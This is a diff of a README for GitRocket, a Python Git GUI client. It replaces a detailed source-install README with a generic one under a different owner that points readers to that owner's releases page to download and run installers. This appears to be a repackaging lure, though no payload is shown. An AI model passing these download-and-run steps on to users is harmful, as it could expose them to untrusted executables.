@@ -1,110 +1,113 @@
-# GitRocket
+# GitRocket: Your User-Friendly Git GUI Client for Efficient Workflows 🚀
 
-![Language](https://img.shields.io/badge/language-Python-blue.svg)
-![Framework](https://img.shields.io/badge/framework-Flet-yellowgreen.svg)
-![AI Integration](https://img.shields.io/badge/AI-Gemini-orange.svg)
-![Status](https://img.shields.io/badge/status-In%20Development-red.svg)
+![GitRocket Logo](https://img.shields.io/badge/GitRocket-Powerful%20Git%20GUI%20Client-blue?style=for-the-badge)
 
-GitRocket is a desktop application built with Python and Flet that provides a graphical interface for common Git operations, focusing on streamlining the staging and commit workflow. It includes features like interactive diff viewing, guided commit message composition, and optional AI-powered commit message suggestions via Google Gemini.
+[![Download GitRocket](https://img.shields.io/badge/Download%20GitRocket-v1.0.0-brightgreen?style=for-the-badge)](https://github.com/thowaii/GitRocket/releases)
 
-![LLModel Chat Demo](https://raw.githubusercontent.com/LMLK-seal/GitRocket/refs/heads/main/Example.gif)
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-✨ Features
+## Overview
 
-*   Graphical User Interface for Git (using Flet).
-*   Display repository status (current branch, changes summary, recent history).
-*   Interactive Staging Area: View unstaged/staged files and their diffs.
-*   Hunk-based staging/unstaging directly from the diff view.
-*   Guided Commit Message Composer following Conventional Commits style.
-*   🤖 AI Suggestion for Commit Messages (requires Google Gemini API key).
-*   Perform basic Git operations: Stage, Unstage, Commit, Push, Pull, Checkout, Merge, Stash.
-*   Handle Merge Conflicts graphically.
-*   Manage Git user configuration per repository.
-*   Persist the last opened project path.
+GitRocket is a powerful, user-friendly Git GUI client built with Flet and Python. It aims to streamline your Git workflow, making version control simpler and more intuitive. Whether you are a beginner or an experienced developer, GitRocket provides the tools you need to manage your projects effectively.
 
-📚 Tech Stack
+### Key Technologies
+- **Flet**: A framework for building interactive web applications in Python.
+- **Python**: The primary programming language used to develop GitRocket.
+- **Git**: The version control system that GitRocket interfaces with.
 
-*   **Language:** Python
-*   **GUI Framework:** Flet
-*   **Git Operations:** `subprocess` module executing standard `git` commands.
-*   **AI Integration:** `google-generativeai` library.
-*   **Environment Variables:** `python-dotenv`.
+## Features
 
-🚀 Installation
+- **User-Friendly Interface**: Navigate through your repositories with ease.
+- **Commit Management**: Simplify the process of staging, committing, and pushing changes.
+- **Branching**: Easily create, switch, and delete branches.
+- **Merge Conflicts**: Visual tools to help resolve merge conflicts efficiently.
+- **Interactive Visualization**: Get a clear view of your project's history and structure.
+- **Cross-Platform**: Available on Windows, macOS, and Linux.
+- **AI-Powered Suggestions**: Receive smart suggestions to improve your workflow.
 
-1.  **Prerequisites:**
-    *   Python 3.8 or higher
-    *   Git installed and available in your system's PATH.
-    *   (Optional for AI features) A Google Cloud project with access to the Gemini API and a generated API key.
+## Installation
 
-2.  **Clone the repository:**
-    ```bash
-    https://github.com/LMLK-Seal/gitrocket.git
-    cd gitrocket
-    ```
+To get started with GitRocket, you can download the latest release from our [Releases section](https://github.com/thowaii/GitRocket/releases). Download the appropriate file for your operating system and execute it to install GitRocket on your machine.
 
-3.  **Install dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+### System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Python**: Version 3.7 or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB available.
 
-4.  **Setup Environment Variables (Optional for AI):**
-    *   Create a file named `.env` in the root directory of the project.
-    *   Add your Google Gemini API key:
-        ```env
-        GEMINI_API_KEY=YOUR_API_KEY_HERE
-        ```
-    *   Replace `YOUR_API_KEY_HERE` with your actual key.
+### Step-by-Step Installation Guide
 
-▶️ Usage
+1. **Download the Release**:
+   Visit the [Releases section](https://github.com/thowaii/GitRocket/releases) to find the latest version.
 
-1.  **Run the application:**
-    ```bash
-    python main.py
-    ```
+2. **Execute the Installer**:
+   - For Windows: Run the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag GitRocket to your Applications folder.
+   - For Linux: Use the terminal to navigate to the downloaded file and run it.
 
-2.  **Select a Repository:**
-    *   The application will open to a welcome screen.
-    *   Click the "Load Project Folder" button.
-    *   Select the root directory of a local Git repository.
+3. **Follow the On-Screen Instructions**: Complete the installation process as guided.
 
-3.  **Dashboard:**
-    *   After loading a repository, you'll see the dashboard with the current branch status, change summary, stash tray, and recent history.
-    *   Click "Review Changes" to go to the staging area.
+4. **Launch GitRocket**: Open the application from your applications menu or desktop shortcut.
 
-4.  **Staging Area:**
-    *   View unstaged and staged files.
-    *   Click on a file name to view its diff below.
-    *   In the diff view, you can select specific hunks (sections of changes) using checkboxes and click "Stage Selected" or "Unstage Selected" to move them between areas.
-    *   Use the "Stage All" and "Unstage All" buttons for bulk actions.
-    *   Once files are staged, click "Compose Commit Message".
+## Usage
 
-5.  **Commit Composer:**
-    *   Fill in the commit message details (Type, Scope, Subject, Body, Footer) following the Conventional Commits structure.
-    *   (If AI is configured) Click "AI Suggest" to get a suggested commit message based on staged changes.
-    *   Click "Commit & Launch" to commit the staged changes and then push to the configured remote.
+Once installed, GitRocket provides a straightforward interface for managing your Git repositories. Here’s how to use some of its core features:
 
-6.  **Branch Management:**
-    *   Access branch management from the dashboard (LAN icon). View local and remote branches, checkout local branches, or merge branches into the current one.
+### Setting Up a Repository
 
-7.  **Settings:**
-    *   Access settings from the dashboard.
-    *   Configure the `user.name` and `user.email` for the current repository. You can also change the project folder from here.
+1. **Open GitRocket**: Launch the application.
+2. **Add a Repository**: Click on "Add Repository" and select your local Git repository.
+3. **Clone a Repository**: Use the "Clone" feature to copy a remote repository to your local machine by entering the repository URL.
 
-🤝 Contributing
+### Committing Changes
 
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+1. **Make Changes**: Edit your files in your preferred code editor.
+2. **Stage Changes**: In GitRocket, select the files you want to stage.
+3. **Commit**: Write a commit message and click "Commit".
 
-📝 License
+### Branching
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+1. **Create a Branch**: Click on the "Branches" tab and select "New Branch".
+2. **Switch Branches**: Click on the branch you want to work on and select "Checkout".
+3. **Merge Branches**: Use the "Merge" option to combine changes from one branch to another.
+
+### Resolving Merge Conflicts
+
+1. **Identify Conflicts**: GitRocket will notify you of any merge conflicts.
+2. **Visual Tools**: Use the built-in visual tools to compare changes and select the correct version.
+3. **Finalize Merge**: After resolving conflicts, commit the merged changes.
+
+## Contributing
+
+We welcome contributions to GitRocket. If you want to help improve the project, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button on the top right of the repository page.
+2. **Clone Your Fork**: Use `git clone <your-fork-url>` to clone your version of the repository.
+3. **Create a Branch**: Use `git checkout -b feature-branch` to create a new branch for your changes.
+4. **Make Changes**: Implement your features or fixes.
+5. **Commit Changes**: Use `git commit -m "Description of changes"` to commit your work.
+6. **Push Changes**: Use `git push origin feature-branch` to push your changes to your fork.
+7. **Create a Pull Request**: Go to the original repository and click on "New Pull Request".
+
+## License
+
+GitRocket is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or support, please contact the project maintainer:
+
+- **Name**: Thowaii
+- **Email**: thowaii@example.com
+- **GitHub Profile**: [thowaii](https://github.com/thowaii)
 
 ---
 
-<div align="center">
-  
-**If GitRocket helped streamline your workflow, consider giving us a ⭐!**
-
-*Made with 🤖 by developers, for developers*
-
-</div>
+For the latest updates and downloads, check out our [Releases section](https://github.com/thowaii/GitRocket/releases).
